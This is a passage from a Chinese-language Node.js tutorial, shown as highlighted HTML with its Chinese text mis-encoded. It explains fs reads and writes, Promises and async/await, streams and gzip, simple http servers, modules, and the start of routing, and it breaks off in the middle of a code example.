<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-comment">//readFileSync(æ–‡ä»¶åœ°å€,ç¼–ç æ ¼å¼) åŒæ­¥è¯»å–æ–‡ä»¶ </span>
<span class="hljs-keyword">let</span> readMe = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> writeMe = <span class="hljs-string">"hello yj"</span>;
<span class="hljs-comment">//writeFileSync(æ–‡ä»¶åœ°å€,å†™å…¥å†…å®¹) åŒæ­¥å†™å…¥æ–‡ä»¶,å¦‚æ²¡æœ‰æ–‡ä»¶,åˆ™åˆ›å»ºæ–°æ–‡ä»¶</span>
fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">"./writeMe.txt"</span>,writeMe);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(readMe);
</code></pre>
<p>åŒæ—¶ä»–ä¹Ÿæœ‰åŒæ­¥å’Œå¼‚æ­¥çš„é—®é¢˜,fs.readFileæœ¬èº«æ˜¯å¼‚æ­¥æ‰§è¡Œ</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);
<span class="hljs-comment">//æ§åˆ¶å°è¾“å‡ºç»“æœ</span>
finshed
hello hzh
</code></pre>
<p>å½“æˆ‘ä»¬æ·»åŠ äº†**åŒæ­¥ while **</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
    <span class="hljs-keyword">if</span>(err){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è¯»å–æ–‡ä»¶å¤±è´¥"</span>);    
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    }
});
<span class="hljs-comment">//åœ¨è¿™é‡Œæˆ‘ä»¬ä¼šç­‰å¾…ä¸‰ç§’</span>
<span class="hljs-keyword">let</span> waitTill = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() + <span class="hljs-number">3</span>*<span class="hljs-number">1000</span>);
<span class="hljs-keyword">while</span>(waitTill &gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()){}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);


<span class="hljs-comment">//æ§åˆ¶å°è¾“å‡ºç»“æœ</span>
<span class="hljs-comment">//ç­‰å¾…ä¸‰ç§’ä¹‹å</span>
finshed
hello hzh
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong></p>
<p>å¯¹è¯»å†™éƒ½ä½¿ç”¨å¼‚æ­¥çš„æ–¹æ¡ˆå¤„ç†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> readMe = fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
    fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">"./writeMe.txt"</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ–‡ä»¶å†™å…¥æˆåŠŸ"</span>);
    });
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);
</code></pre>
<h3 data-id="heading-10">æ‹“å±•</h3>
<p>ç°ä»£jsç”¨çš„æ›´å¤šçš„ <strong>Promise</strong> + <strong>async/await</strong></p>
<p><strong>Promise</strong> æ˜¯ä¸€ä¸ª<strong>è¡¨ç¤ºå¼‚æ­¥æ“ä½œæœ€ç»ˆå®Œæˆæˆ–å¤±è´¥çš„å¯¹è±¡</strong>ã€‚</p>
<p><strong>Promise</strong> æœ‰ä¸‰ç§çŠ¶æ€ <strong>fulfilled</strong>(æˆåŠŸ) ã€<strong>rejected</strong>(å¤±è´¥) ã€<strong>pending</strong>(ç­‰å¾…)</p>
<p>é€šä¿—ä¸€ç‚¹çš„è¯´æ³•:  resolveè¡¨ç¤ºæˆåŠŸ,rejectè¡¨ç¤ºå¤±è´¥,åªæœ‰æˆåŠŸå’Œå¤±è´¥,ä¸¤è€…ä¸ä¼šåŒæ—¶å‡ºç°</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fetchData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-comment">//pending</span>
    <span class="hljs-keyword">let</span> num = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span>){
        <span class="hljs-comment">//fulfilled</span>
        <span class="hljs-title function_">resolve</span>(num)
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-comment">//rejected</span>
        <span class="hljs-title function_">reject</span>(<span class="hljs-string">"é”™è¯¯"</span>)
    }
})
</code></pre>
<p>å¸¸ç”¨çš„å°±æ˜¯ <strong>.then()</strong> å’Œ <strong>.catch()</strong>   <strong>.finally()</strong> ä¸å’‹è§</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fetchData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-keyword">let</span> num = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span>){
        <span class="hljs-title function_">resolve</span>(num)
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-title function_">reject</span>(<span class="hljs-string">"é”™è¯¯"</span>)
    }
    
})

fetchData.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆåŠŸ:"</span>, result); <span class="hljs-comment">//è¾“å‡ºç»“æœ æˆåŠŸ:1</span>
    }).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¤±è´¥:"</span>, error); <span class="hljs-comment">//è¾“å‡ºç»“æœ å¤±è´¥:é”™è¯¯</span>
    }).<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ“ä½œå®Œæˆ"</span>);
    });

<span class="hljs-comment">//æ§åˆ¶å°ä¸ä¼šåŒæ—¶å‡ºç° æˆåŠŸ:1 å¤±è´¥:é”™è¯¯</span>
</code></pre>
<p><strong>async/await</strong> çœ‹èµ·æ¥åƒåŒæ­¥ï¼Œä½†æœ¬è´¨è¿˜æ˜¯å¼‚æ­¥</p>
<p><strong>await çš„å·¥ä½œæµç¨‹ï¼š</strong></p>
<ol>
<li>æ‰§è¡Œåˆ° <code>await</code> æ—¶ï¼Œå‡½æ•°ä¼š<strong>æš‚åœ</strong></li>
<li>ä½†ä¸æ˜¯é˜»å¡æ•´ä¸ªç¨‹åºï¼Œè€Œæ˜¯<strong>æŠŠæ§åˆ¶æƒäº¤è¿˜ç»™äº‹ä»¶å¾ªç¯</strong></li>
<li>ç­‰å…¶ä»–åŒæ­¥ä»£ç æ‰§è¡Œå®Œåï¼Œæ–‡ä»¶è¯»å–å®Œæˆäº†</li>
<li>äº‹ä»¶å¾ªç¯é‡æ–°æ¿€æ´»è¿™ä¸ª async å‡½æ•°ï¼Œä» await åé¢ç»§ç»­æ‰§è¡Œ</li>
</ol>
<p>çœ‹ä¸‹é¢ä»£ç </p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. è„šæœ¬å¼€å§‹"</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2. è¿›å…¥asyncå‡½æ•°"</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"3. å‡†å¤‡è¯»å–æ–‡ä»¶"</span>);
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-property">promises</span>.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./file.txt'</span>, <span class="hljs-string">'utf8'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"4. æ–‡ä»¶è¯»å–å®Œæˆ:"</span>, data.<span class="hljs-property">length</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"5. å‡†å¤‡å†™å…¥æ–‡ä»¶"</span>); 
    <span class="hljs-keyword">await</span> fs.<span class="hljs-property">promises</span>.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">'./output.txt'</span>, data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"6. æ–‡ä»¶å†™å…¥å®Œæˆ"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"7. è°ƒç”¨asyncå‡½æ•°"</span>);
<span class="hljs-title function_">main</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"8. asyncå‡½æ•°è°ƒç”¨å®Œæ¯•"</span>);

<span class="hljs-comment">// å®é™…è¾“å‡ºé¡ºåºï¼š</span>
<span class="hljs-comment">// 1. è„šæœ¬å¼€å§‹</span>
<span class="hljs-comment">// 7. è°ƒç”¨asyncå‡½æ•°  </span>
<span class="hljs-comment">// 2. è¿›å…¥asyncå‡½æ•°</span>
<span class="hljs-comment">// 3. å‡†å¤‡è¯»å–æ–‡ä»¶</span>
<span class="hljs-comment">// 8. asyncå‡½æ•°è°ƒç”¨å®Œæ¯•</span>
<span class="hljs-comment">// 4. æ–‡ä»¶è¯»å–å®Œæˆ: 123</span>
<span class="hljs-comment">// 5. å‡†å¤‡å†™å…¥æ–‡ä»¶</span>
<span class="hljs-comment">// 6. æ–‡ä»¶å†™å…¥å®Œæˆ</span>
</code></pre>
<p><strong>Promise + async/await çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… <strong>ä»£ç æ›´æ¸…æ™°</strong>ï¼šåƒå†™åŒæ­¥ä»£ç ä¸€æ ·å†™å¼‚æ­¥ä»£ç </li>
<li>âœ… <strong>é”™è¯¯å¤„ç†æ›´ç®€å•</strong>ï¼šä½¿ç”¨ try/catch</li>
<li>âœ… <strong>è°ƒè¯•æ›´æ–¹ä¾¿</strong>ï¼šå †æ ˆè·Ÿè¸ªæ›´æ¸…æ™°</li>
<li>âœ… <strong>ç»„åˆæ›´çµæ´»</strong>ï¼šPromise.allã€Promise.race ç­‰</li>
<li>âœ… <strong>ç°ä»£æ ‡å‡†</strong>ï¼šæ˜¯ JavaScript å¼‚æ­¥ç¼–ç¨‹çš„æœªæ¥</li>
</ul>
<h2 data-id="heading-11">7.æµå’Œç®¡é“</h2>
<p>æµçš„æ¦‚å¿µå¹¶ä¸éš¾ç†è§£ï¼Œä¾‹å¦‚ï¼šæˆ‘ä»¬å¹³æ—¶å‰åç«¯äº¤äº’å…¶å®å°±æ˜¯è½¬æ¢æˆæµæ¥è¿›è¡Œäº¤äº’çš„ï¼Œæˆ‘ä»¬ä¹‹å‰ä¹Ÿè®²è¿‡æ–‡ä»¶çš„è¯»å†™ï¼Œæ–‡ä»¶çš„è¯»å†™ä¹Ÿå±äºæµçš„æ“ä½œçš„ä½“ç°ã€‚è¿™æ˜¯å¦‚æœæ–‡ä»¶ç‰¹åˆ«å¤§çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦é‡‡å–bufferå¤„ç†</p>
<p>æˆ‘ä»¬ç°åœ¨å‘½ä»¤è¡Œä¸­æ“ä½œä¸€ä¸ªåŸºç¡€æ“ä½œ</p>
<pre><code class="hljs language-js" lang="js">ls

ls | grep <span class="hljs-title function_">app</span>(æ³¨æ„ app è¦å¯¹åº”ä½ çš„æ–‡ä»¶å æ¯”å¦‚ code.<span class="hljs-property">js</span> å¯¹åº”ä¸º ls | grep code)
</code></pre>
<p>ls | grep app è¿™ä¸ªå‘½ä»¤åœ¨ <strong>linux</strong> æˆ–è€… <strong>mac</strong> æ‰åˆé€‚</p>
<p>å¦‚æœæ˜¯ <strong>window</strong> ,å¯¹åº”å‘½ä»¤åº”è¯¥ä¸º dir | findstr app</p>
<pre><code class="hljs language-js" lang="js">dir | findstr <span class="hljs-title function_">app</span>(æ³¨æ„ app è¦å¯¹åº”ä½ çš„æ–‡ä»¶å æ¯”å¦‚ code.<span class="hljs-property">js</span> å¯¹åº”ä¸º ls | grep code)
</code></pre>
<p>ä¸‹é¢ä»£ç å½“æ‰§è¡Œ node code å‘½ä»¤å</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>);

myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"**********"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk);
});

<span class="hljs-comment">//æ§åˆ¶å°è¾“å‡ºç»“æœ</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Buffer</span> <span class="hljs-attr">68</span> <span class="hljs-attr">65</span> <span class="hljs-attr">6c</span> <span class="hljs-attr">6c</span> <span class="hljs-attr">6f</span> <span class="hljs-attr">20</span> <span class="hljs-attr">68</span> <span class="hljs-attr">7a</span> <span class="hljs-attr">68</span>&gt;</span>
</span></code></pre>
<p>ä¸Šè¿°ä»£ç è¯»åˆ°çš„æ˜¯bufferå¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯ä»–æ€§èƒ½æå‡çš„ä¸»è¦åŸå› ã€‚å¦‚æœæ–‡ä»¶è¿‡å¤§ï¼Œä¼šå¤„ç†æˆå¤šä¸ªbufferå¯¹è±¡</p>
<p>å¦‚æœæƒ³ç›´æ¥è¯»å–åˆ°æ•°æ® ,åˆ™å¯ä»¥åŠ ä¸€ä¸ªç¼–ç æ ¼å¼ <strong>utf-8</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);<span class="hljs-comment">//æ–°å¢åœ°æ–¹</span>

myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"**********"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk);
});
<span class="hljs-comment">//æ§åˆ¶å°è¾“å‡ºç»“æœ</span>
hello hzh
</code></pre>
<p>å½“æ•°æ®è¿‡å¤š,ä¼šå¯¼è‡´è¯»å–è¿˜æ²¡æœ‰å®Œæˆ,å°±ç»§ç»­ä¸‹é¢æ“ä½œäº†,å› æ­¤æ”¹å˜ä¸€ä¸‹å†™æ³•</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-string">''</span>;
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    <span class="hljs-comment">//ç”¨dataå­˜å‚¨æœ€ç»ˆæ•°æ®</span>
    data += chunk;
});
<span class="hljs-comment">// 'end' å½“è¯»å–å®Œæˆæ—¶åœ¨å»è¯»å–data</span>
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
});
</code></pre>
<p>å†™å…¥çš„å†™æ³•  fs.createWriteStream    myWriteStream.write(data);</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> myWriteStream = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/writeMe.txt"</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-string">""</span>;
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>){
    data += chunk;
})
myReadStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
    myWriteStream.<span class="hljs-title function_">write</span>(data);
});
</code></pre>
<h3 data-id="heading-12">æ‹“å±•</h3>
<p>æœ‰ä¸€ä¸ª <strong>å‹ç¼©</strong> å’Œ <strong>è§£å‹</strong> çš„æ“ä½œ,æ˜¯å…³äºæœåŠ¡å™¨å¼€å‘çš„æ“ä½œ</p>
<p>å‹ç¼©</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">"zlib"</span>);
<span class="hljs-keyword">let</span> myReadStream2 = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> myWriteStream2 = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/readMe.txt.gz"</span>);
<span class="hljs-keyword">let</span> gzip = zlib.<span class="hljs-title function_">createGzip</span>();
myReadStream2.<span class="hljs-title function_">pipe</span>(gzip).<span class="hljs-title function_">pipe</span>(myWriteStream2);
</code></pre>
<p>è§£å‹</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">"zlib"</span>);
<span class="hljs-keyword">let</span> myReadStream3 = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt.gz"</span>);
<span class="hljs-keyword">let</span> myWriteStream3 = fs.<span class="hljs-title function_">createWriteStream</span>(__dirname + <span class="hljs-string">"/readMe2.txt"</span>);
<span class="hljs-keyword">let</span> gunzip = zlib.<span class="hljs-title function_">createGunzip</span>();
myReadStream3.<span class="hljs-title function_">pipe</span>(gunzip).<span class="hljs-title function_">pipe</span>(myWriteStream3);
</code></pre>
<h2 data-id="heading-13">8.WebæœåŠ¡å™¨è¾“å‡ºå†…å®¹</h2>
<p>ç”¨çš„æœ€å¤šçš„å°±æ˜¯ç”¨Nodeæ„å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¹¶ä¸”è¾“å‡ºå†…å®¹ï¼Œå†…å®¹è¾“å‡ºç»å¤§å¤šæ•°ä¸ºJSONæ•°æ®</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'request'</span>)
}
server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
<span class="hljs-comment">//æ§åˆ¶å°æ‰“å°  ä½†éœ€è¦åœ¨æµè§ˆå™¨ä¸­å¯åŠ¨æœåŠ¡å™¨ åœ¨åœ°å€æ è¾“å…¥ http://localhost:3000</span>
request
</code></pre>
<p>è¾“å‡º <strong>html</strong> æˆ–è€… <strong>çº¯æ–‡æœ¬</strong> æ ¼å¼ {'Content-Type':'text/plain'}</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    <span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/index.html"</span>,<span class="hljs-string">'utf-8'</span>);
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
        <span class="hljs-comment">//çº¯æ–‡æœ¬ã€htmlã€json</span>
        {<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'text/plain'</span>}
    );
    myReadStream.<span class="hljs-title function_">pipe</span>(res);
})

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
</code></pre>
<p>è§£é‡Š: .pipe()å®ƒçš„ä½œç”¨æ˜¯<strong>è¿æ¥å¯è¯»æµå’Œå¯å†™æµ</strong>ï¼Œå®ç°æ•°æ®çš„è‡ªåŠ¨ä¼ è¾“</p>
<p>è¾“å‡º <strong>json</strong> æ ¼å¼  {'Content-Type':'application/json'}</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
        <span class="hljs-comment">//çº¯æ–‡æœ¬ã€htmlã€json</span>
        {<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'application/json'</span>}
    );
    <span class="hljs-keyword">let</span> obj = {
        <span class="hljs-attr">name</span>:<span class="hljs-string">'hzh'</span>,
        <span class="hljs-attr">age</span>:<span class="hljs-number">18</span>
    }
    res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
})

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
</code></pre>
<h2 data-id="heading-14">9.æ¨¡å—åŒ–</h2>
<p>è¿™ä¸ªç›¸å¯¹ç®€å•,å°±æ˜¯æŠŠä¸€ä¸ªåŠŸèƒ½å•ç‹¬ç»™å°è£…èµ·æ¥,ä½¿<strong>ç»“æ„æ›´åŠ æ¸…æ™°</strong>,<strong>æ–¹ä¾¿ç»´æŠ¤</strong>(ä¸‹é¢ä»£ç æ‹†åˆ†æˆä¸‰ä¸ªæ–‡ä»¶:æœåŠ¡å™¨æ–‡ä»¶ã€ æ•°æ®æ–‡ä»¶ã€ä¸»å…¥å£æ–‡ä»¶)</p>
<p>ç”¨ startServer() æ–¹æ³•ç»™ä»£ç å°è£…èµ·æ¥ module.exports å¯¼å‡º</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js æœåŠ¡å™¨æ–‡ä»¶</span>
<span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-comment">//å¯¼å…¥ data.json æ–‡ä»¶</span>
<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./data.json"</span>)
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) {
        res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,
            { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> }
        );
        res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    })

    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<p>æ•°æ®ä¹Ÿå¯ä»¥è¿›è¡Œå•ç‹¬çš„å°è£…</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// data.json æ•°æ®æ–‡ä»¶</span>
{
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"hzh"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-number">18</span>
}
</code></pre>
<p>ç„¶å require  å¯¼å…¥ å°±å¯ä»¥ç›´æ¥ä½¿ç”¨é‡Œé¢çš„æ–¹æ³•äº†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// code.js ä¸»å…¥å£æ–‡ä»¶</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./server'</span>)
server.<span class="hljs-title function_">startServer</span>();
</code></pre>
<h2 data-id="heading-15">10.è·¯ç”±</h2>
<p>åœ¨å®é™…çš„å¼€å‘åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒçš„åœ°å€è¿”å›ä¸åŒçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ—¥å¸¸æ‰€è¯´çš„è·¯ç”±æ•ˆæœ</p>
<p>çŸ¥è¯†ç‚¹:request.url ,è·å–å½“å‰è·¯å¾„</p>
<p>å¦‚ <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> å¯¹åº” request.url = "/"  <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000%2Fdata" target="_blank" title="http://localhost:3000/data" ref="nofollow noopener noreferrer">http://localhost:3000/data</a> å¯¹åº” request.url = "/data"</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./data.json'</span>);
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
        <span class="hljs-keyword">let</span> url = request.<span class="hljs-property">url</span>;
        <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/data"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
